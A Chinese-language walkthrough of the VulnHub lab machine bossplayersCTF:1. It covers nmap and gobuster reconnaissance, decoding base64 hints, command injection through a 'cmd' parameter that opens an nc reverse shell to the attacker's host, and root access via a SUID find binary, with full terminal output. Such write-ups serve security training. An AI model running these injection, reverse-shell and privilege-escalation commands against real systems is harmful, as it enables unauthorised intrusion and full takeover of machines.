# BOSSPLAYERSCTF:1主机渗透实现

- 靶机地址:https://www.vulnhub.com/entry/bossplayersctf-1,375/
- 下载地址:https://download.vulnhub.com/bossplayers/bossplayersCTF.ova



## 信息收集:

### 主机发现:

- 当前IP段:`192.168.0.1/24`,当前主机IP:`192.168.0.204`

- ```shell
  └─$ sudo nmap -sn 192.168.0.1/24                                          
  [sudo] password for kali: 
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 18:15 EDT
  Nmap scan report for 192.168.0.136
  Host is up (0.00050s latency).
  Nmap scan report for 192.168.0.204
  Host is up.
  Nmap done: 256 IP addresses (12 hosts up) scanned in 25.22 seconds
  ```

- 靶机IP:`192.168.0.136`

### 端口扫描:

- TCP端口扫描

- ```shell
  └─$ sudo nmap -sT --min-rate 10000 -p- 192.168.0.136 -oA Nmap-scan/sT
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 18:19 EDT
  Nmap scan report for 192.168.0.136
  Host is up (0.00061s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  MAC Address: 08:00:27:53:23:AD (Oracle VirtualBox virtual NIC)
  
  Nmap done: 1 IP address (1 host up) scanned in 15.89 seconds
  ```

- UDP端口扫描

- ```shell
  └─$ sudo nmap -sU --min-rate 10000 -p- 192.168.0.136 -oA Nmap-scan/sU
  [sudo] password for kali: 
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 18:19 EDT
  Warning: 192.168.0.136 giving up on port because retransmission cap hit (10).
  Nmap scan report for 192.168.0.136
  Host is up (0.00099s latency).
  All 65535 scanned ports on 192.168.0.136 are in ignored states.
  Not shown: 65456 open|filtered udp ports (no-response), 79 closed udp ports (port-unreach)
  MAC Address: 08:00:27:53:23:AD (Oracle VirtualBox virtual NIC)
  
  Nmap done: 1 IP address (1 host up) scanned in 85.30 seconds
  
  ┌──(kali㉿kali)-[~/Desktop/bossplayersCTF]
  └─$ sudo nmap -sU --min-rate 10000 --top-port 20 192.168.0.136 -oA Nmap-scan/sU
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 18:22 EDT
  Nmap scan report for 192.168.0.136
  Host is up (0.00044s latency).
  
  PORT      STATE         SERVICE
  53/udp    open|filtered domain
  67/udp    open|filtered dhcps
  68/udp    open|filtered dhcpc
  69/udp    open|filtered tftp
  123/udp   closed        ntp
  135/udp   open|filtered msrpc
  137/udp   open|filtered netbios-ns
  138/udp   open|filtered netbios-dgm
  139/udp   open|filtered netbios-ssn
  161/udp   closed        snmp
  162/udp   closed        snmptrap
  445/udp   closed        microsoft-ds
  500/udp   open|filtered isakmp
  514/udp   open|filtered syslog
  520/udp   closed        route
  631/udp   open|filtered ipp
  1434/udp  open|filtered ms-sql-m
  1900/udp  open|filtered upnp
  4500/udp  open|filtered nat-t-ike
  49152/udp open|filtered unknown
  MAC Address: 08:00:27:53:23:AD (Oracle VirtualBox virtual NIC)
  
  Nmap done: 1 IP address (1 host up) scanned in 11.49 seconds
  ```

### 服务及操作系统扫描

- ```shell
  └─$ sudo nmap -sC -sV -O -p22,80 192.168.0.136 -oA Nmap-scan/sC  
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 18:20 EDT
  Nmap scan report for 192.168.0.136
  Host is up (0.00047s latency).
  
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
  | ssh-hostkey: 
  |   2048 ac:0d:1e:71:40:ef:6e:65:91:95:8d:1c:13:13:8e:3e (RSA)
  |   256 24:9e:27:18:df:a4:78:3b:0d:11:8a:92:72:bd:05:8d (ECDSA)
  |_  256 26:32:8d:73:89:05:29:43:8e:a1:13:ba:4f:83:53:f8 (ED25519)
  80/tcp open  http    Apache httpd 2.4.38 ((Debian))
  |_http-server-header: Apache/2.4.38 (Debian)
  |_http-title: Site doesn't have a title (text/html).
  MAC Address: 08:00:27:53:23:AD (Oracle VirtualBox virtual NIC)
  Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
  Aggressive OS guesses: Linux 3.2 - 4.9 (98%), Linux 2.6.32 (94%), Linux 4.15 - 5.8 (94%), Linux 2.6.32 - 3.10 (93%), Linux 5.1 (93%), Linux 3.10 - 4.11 (92%), Linux 3.13 (92%), Linux 4.10 (92%), Linux 3.4 - 3.10 (92%), Linux 5.0 - 5.5 (92%)
  No exact OS matches for host (test conditions non-ideal).
  Network Distance: 1 hop
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 26.99 seconds
  ```



### 默认漏洞脚本扫描

- ```shell
  └─$ sudo nmap --script=vuln -p22,80 192.168.0.136 -oA Nmap-scan/Script  
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 18:22 EDT
  Nmap scan report for 192.168.0.136
  Host is up (0.00048s latency).
  
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
  |_http-csrf: Couldn't find any CSRF vulnerabilities.
  |_http-dombased-xss: Couldn't find any DOM based XSS.
  | http-enum: 
  |   /logs.php: Logs
  |_  /robots.txt: Robots file
  MAC Address: 08:00:27:53:23:AD (Oracle VirtualBox virtual NIC)
  
  Nmap done: 1 IP address (1 host up) scanned in 42.08 seconds
  ```

## web信息收集:

- web首页信息:

- ![image-20230823062437317](https://raw.githubusercontent.com/r0o983/images/main/202308230624404.png)

- 在手工测试`robots.txt`文件中发现一串base64编码的密文,尝试解密`echo "bG9sIHRyeSBoYXJkZXIgYnJvCg==" | base64 -d`

- ![image-20230823062856945](https://raw.githubusercontent.com/r0o983/images/main/202308230628984.png)

- 密文:`lol try harder bro`  

- 在查看首页源代码时,发现页面底部有一串特殊字符

- ![image-20230823073705346](https://raw.githubusercontent.com/r0o983/images/main/202308230737395.png)

- 将字符串进行base64解码:

- ```shell
  └─$ echo "WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK" | base64 -d | base64 -d | base64 -d   
  workinginprogress.php
  ```

- 经过三次解码之后得到一个新的页面,页面提示如下

- ![image-20230823073929950](https://raw.githubusercontent.com/r0o983/images/main/202308230739005.png)

- 这里提示`say Hi to Haley`,猜测Haley可能也是系统的管理员或用户之一.稍后尝试进行ssh登录测试,同时提示这里还有两项任务未完成,一是测试ping命令,二是修复权限提升,尝试在地址栏加入参数进行测试

- ![image-20230823081914074](https://raw.githubusercontent.com/r0o983/images/main/202308230819169.png)

- 有正常回显,使用`nc` 进行反弹连接.

### gobuster目录扫描

- ```shell
  └─$ gobuster dir -u http://192.168.0.136/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -o bossplayersCTF/gobuster
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://192.168.0.136/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt,php
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.php                 (Status: 403) [Size: 292]
  /robots.txt           (Status: 200) [Size: 53]
  /logs.php             (Status: 200) [Size: 34093]
  /.php                 (Status: 403) [Size: 292]
  /server-status        (Status: 403) [Size: 301]
  Progress: 661680 / 661683 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```

- logs页面,似乎都是一些操作系统日志...
- ![image-20230823074416775](https://raw.githubusercontent.com/r0o983/images/main/202308230744901.png)



### 获得初始shell

- 使用命令`?cmd=nc 192.168.0.204 1234 -e /bin/bash`进行反弹shell,本地开启监听等待连接

- ```shell
  └─$ nc -nvlp 1234                                                              
  listening on [any] 1234 ...
  connect to [192.168.0.204] from (UNKNOWN) [192.168.0.136] 58558
  whoami
  www-data
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  uname -a
  Linux bossplayers 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux
  ls
  index.html
  logs.php
  robots.txt
  workinginprogress.php
  python -c 'import pty;pty.spawn("/bin/bash")';
  www-data@bossplayers:/var/www/html$ clear       
  clear
  TERM environment variable not set.
  www-data@bossplayers:/var/www/html$ export TERM=xterm-color
  export TERM=xterm-color
  www-data@bossplayers:/var/www/html$ clea
  clear
  www-data@bossplayers:/var/www/html$ ls
  ls
  index.html  logs.php  robots.txt  workinginprogress.php
  www-data@bossplayers:/var/www/html$ cd ..
  cd ..
  www-data@bossplayers:/var/www$ ls
  ls
  html
  www-data@bossplayers:/var/www$ cat /etc/passwd
  cat /etc/passwd
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
  systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
  systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
  systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
  messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
  avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
  cuong:x:1000:1000:cuong,,,:/home/cuong:/bin/bash
  systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
  sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
  www-data@bossplayers:/var/www$ cat /etc/crontab
  cat /etc/crontab
  # /etc/crontab: system-wide crontab
  # Unlike any other crontab you don't have to run the `crontab'
  # command to install the new version when you edit this file
  # and files in /etc/cron.d. These files also have username fields,
  # that none of the other crontabs do.
  
  SHELL=/bin/sh
  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
  
  # Example of job definition:
  # .---------------- minute (0 - 59)
  # |  .------------- hour (0 - 23)
  # |  |  .---------- day of month (1 - 31)
  # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
  # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
  # |  |  |  |  |
  # *  *  *  *  * user-name command to be executed
  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  #
  www-data@bossplayers:/var/www$ 
  ```

## 提权

- 查找当前用户具有`S`位执行权限的文件`find / -perm -u=s -type f 2>/dev/null`

- ```
  └─$ nc -nvlp 1234
  listening on [any] 1234 ...
  connect to [192.168.0.204] from (UNKNOWN) [192.168.0.136] 58568
  python -c 'import pty;pty.spawn("/bin/bash")';
  www-data@bossplayers:/var/www/html$ whoami
  whoami
  www-data
  www-data@bossplayers:/var/www/html$ find / -perm -u=s -type f 2>/dev/null       
  find / -perm -u=s -type f 2>/dev/null
  /usr/bin/mount
  /usr/bin/umount
  /usr/bin/gpasswd
  /usr/bin/su
  /usr/bin/chsh
  /usr/bin/grep
  /usr/bin/chfn
  /usr/bin/passwd
  /usr/bin/find
  /usr/bin/newgrp
  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /usr/lib/openssh/ssh-keysign
  /usr/lib/eject/dmcrypt-get-device
  ```

- 使用`find`命令进行提权操作

- 参数说明:

  - find 查找文件
  - -exec 执行命令
  - /bin/sh -p 启动`sh`的shell,并使用`-p`参数来进行权限提升
  - `\;` 用于提示命令结束; 斜杠用来转义之后的分号

- ```shell
  www-data@bossplayers:/var/www/html$ find . -exec /bin/sh -p \;
  find . -exec /bin/sh -p \;
  # ip a
  ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
      link/ether 08:00:27:53:23:ad brd ff:ff:ff:ff:ff:ff
      inet 192.168.0.136/24 brd 192.168.0.255 scope global dynamic enp0s3
         valid_lft 6289sec preferred_lft 6289sec
      inet6 ::a00:27ff:fe53:23ad/64 scope global dynamic mngtmpaddr 
         valid_lft 296sec preferred_lft 296sec
      inet6 fe80::a00:27ff:fe53:23ad/64 scope link 
         valid_lft forever preferred_lft forever
  # uname -a
  uname -a
  Linux bossplayers 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux
  # cd /root
  cd /root
  # ls -lhai
  ls -lhai
  total 24K
   207 drwx------  2 root root 4.0K Sep 28  2019 .
     2 drwxr-xr-x 18 root root 4.0K Sep 28  2019 ..
    33 -rw-------  1 root root  929 Sep 28  2019 .bash_history
   274 -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
   273 -rw-r--r--  1 root root  148 Aug 18  2015 .profile
  1367 -rw-r--r--  1 root root   25 Sep 28  2019 root.txt
  # cat root.txt  
  cat root.txt
  Y29uZ3JhdHVsYXRpb25zCg==
  # ip a
  ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
      link/ether 08:00:27:53:23:ad brd ff:ff:ff:ff:ff:ff
      inet 192.168.0.136/24 brd 192.168.0.255 scope global dynamic enp0s3
         valid_lft 6278sec preferred_lft 6278sec
      inet6 ::a00:27ff:fe53:23ad/64 scope global dynamic mngtmpaddr 
         valid_lft 300sec preferred_lft 300sec
      inet6 fe80::a00:27ff:fe53:23ad/64 scope link 
         valid_lft forever preferred_lft forever
         
  # echo Y29uZ3JhdHVsYXRpb25zCg== | base64 -d
  echo Y29uZ3JhdHVsYXRpb25zCg== | base64 -d
  congratulations
  ```